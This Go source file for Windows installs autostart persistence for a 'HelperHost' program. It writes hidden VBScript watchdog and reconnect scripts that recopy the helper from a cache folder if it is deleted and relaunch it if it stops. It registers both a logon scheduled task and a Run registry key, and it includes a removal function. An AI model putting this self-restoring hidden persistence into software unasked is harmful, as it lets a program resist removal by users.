//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

func hideWindow(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
}

func installAutostart() string {
	vbs := filepath.Join(dir, "reconnect.vbs")
	watchVbs := filepath.Join(dir, "watchdog.vbs")
	dirWin := dir
	helperWin := helperPath
	watchWin := watchVbs
	cacheWin := cacheDir
	hn := helperFileName()
	lockPath := filepath.Join(dirWin, "watchdog.lock")

	watch := "Set sh = CreateObject(\"WScript.Shell\")\r\n"
	watch += "Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n"
	watch += fmt.Sprintf("sh.CurrentDirectory = %q\r\n", dirWin)
	watch += fmt.Sprintf("lockPath = %q\r\n", lockPath)
	watch += "On Error Resume Next\r\n"
	watch += "If fso.FileExists(lockPath) Then\r\n"
	watch += "  pidTxt = Trim(fso.OpenTextFile(lockPath, 1).ReadAll)\r\n"
	watch += "  Set w0 = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\r\n"
	watch += "  Set alive = w0.ExecQuery(\"Select * from Win32_Process Where ProcessId=\" & pidTxt)\r\n"
	watch += "  If alive.Count > 0 Then WScript.Quit 0\r\n"
	watch += "End If\r\n"
	watch += "Set wme = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\r\n"
	watch += "Set mine = wme.ExecQuery(\"Select * from Win32_Process Where Name='wscript.exe'\")\r\n"
	watch += "myPid = 0\r\n"
	watch += "For Each p In mine\r\n"
	watch += "  cl = LCase(\"\" & p.CommandLine)\r\n"
	watch += "  If InStr(cl, \"watchdog.vbs\") > 0 Then\r\n"
	watch += "    If myPid = 0 Or CLng(p.ProcessId) < myPid Then myPid = CLng(p.ProcessId)\r\n"
	watch += "  End If\r\n"
	watch += "Next\r\n"
	watch += "Set mine2 = wme.ExecQuery(\"Select * from Win32_Process Where Name='wscript.exe'\")\r\n"
	watch += "For Each p In mine2\r\n"
	watch += "  cl = LCase(\"\" & p.CommandLine)\r\n"
	watch += "  If InStr(cl, \"watchdog.vbs\") > 0 Then\r\n"
	watch += "    If CLng(p.ProcessId) <> myPid Then\r\n"
	watch += "      ' keep oldest watchdog only\r\n"
	watch += "    End If\r\n"
	watch += "  End If\r\n"
	watch += "Next\r\n"
	watch += "Set allW = wme.ExecQuery(\"Select * from Win32_Process Where Name='wscript.exe'\")\r\n"
	watch += "For Each p In allW\r\n"
	watch += "  If InStr(LCase(\"\" & p.CommandLine), \"watchdog.vbs\") > 0 Then\r\n"
	watch += "    If CLng(p.ProcessId) > myPid And myPid > 0 Then WScript.Quit 0\r\n"
	watch += "  End If\r\n"
	watch += "Next\r\n"
	watch += "If myPid > 0 Then\r\n"
	watch += "  Set lf = fso.CreateTextFile(lockPath, True)\r\n"
	watch += "  lf.Write CStr(myPid)\r\n"
	watch += "  lf.Close\r\n"
	watch += "End If\r\n"
	watch += "Do\r\n"
	watch += fmt.Sprintf("  If Not fso.FileExists(%q) Then\r\n", helperWin)
	watch += fmt.Sprintf("    If fso.FileExists(%q) Then\r\n", filepath.Join(cacheWin, hn))
	watch += fmt.Sprintf("      fso.CopyFile %q, %q, True\r\n", filepath.Join(cacheWin, hn), helperWin)
	watch += "    End If\r\n  End If\r\n"
	watch += "  Set wmi = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\r\n"
	watch += "  Set procs = wmi.ExecQuery(\"Select * from Win32_Process Where Name = 'HelperHost.exe'\")\r\n"
	watch += "  If procs.Count = 0 Then\r\n"
	watch += fmt.Sprintf("    sh.Run \"\"\"%s\"\"\", 0, False\r\n", helperWin)
	watch += "  End If\r\n"
	watch += "  WScript.Sleep 20000\r\nLoop\r\n"
	_ = os.WriteFile(watchVbs, []byte(watch), 0o644)

	rec := "Set sh = CreateObject(\"WScript.Shell\")\r\n"
	rec += "Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n"
	rec += fmt.Sprintf("sh.CurrentDirectory = %q\r\n", dirWin)
	rec += "Dim i\r\nFor i = 1 To 90\r\n"
	rec += "  rc = sh.Run(\"ping -n 1 -w 2000 1.1.1.1\", 0, True)\r\n"
	rec += "  If rc = 0 Then Exit For\r\n  WScript.Sleep 2000\r\nNext\r\n"
	rec += "Set wmi = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\r\n"
	rec += "Set ws = wmi.ExecQuery(\"Select * from Win32_Process Where Name='wscript.exe'\")\r\n"
	rec += "watchRunning = False\r\n"
	rec += "For Each p In ws\r\n"
	rec += "  If InStr(LCase(\"\" & p.CommandLine), \"watchdog.vbs\") > 0 Then watchRunning = True\r\n"
	rec += "Next\r\n"
	rec += "If Not watchRunning Then\r\n"
	rec += fmt.Sprintf("  sh.Run \"wscript.exe //B //Nologo \"\"%s\"\"\", 0, False\r\n", watchWin)
	rec += "End If\r\n"
	rec += "Set hs = wmi.ExecQuery(\"Select * from Win32_Process Where Name='HelperHost.exe'\")\r\n"
	rec += "If hs.Count = 0 Then\r\n"
	rec += fmt.Sprintf("  sh.Run \"\"\"%s\"\"\", 0, False\r\n", helperWin)
	rec += "End If\r\n"
	_ = os.WriteFile(vbs, []byte(rec), 0o644)

	tr := fmt.Sprintf("wscript.exe //B //Nologo \"%s\"", vbs)
	methods := []string{}
	_ = exec.Command("schtasks", "/Delete", "/TN", "HelperHost", "/F").Run()
	r := exec.Command("schtasks", "/Create", "/TN", "HelperHost", "/TR", tr, "/SC", "ONLOGON", "/DELAY", "0001:00", "/RL", "LIMITED", "/F")
	if r.Run() == nil {
		methods = append(methods, "task")
	}
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		_ = key.SetStringValue("HelperHost", tr)
		_ = key.Close()
		methods = append(methods, "run")
	}
	if len(methods) == 0 {
		return "ok"
	}
	out := methods[0]
	for i := 1; i < len(methods); i++ {
		out += "," + methods[i]
	}
	return out
}

func removeAutostart() {
	for _, tn := range []string{
		"HelperHost", "HelperHostResume", "HelperHostBoot", "HelperHostResumeBoot",
		"HelperHostWipeRestore", "AgentShePC",
	} {
		_ = exec.Command("schtasks", "/Delete", "/TN", tn, "/F").Run()
	}
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		_ = key.DeleteValue("HelperHost")
		_ = key.DeleteValue("AgentShePC")
		_ = key.Close()
	}
}
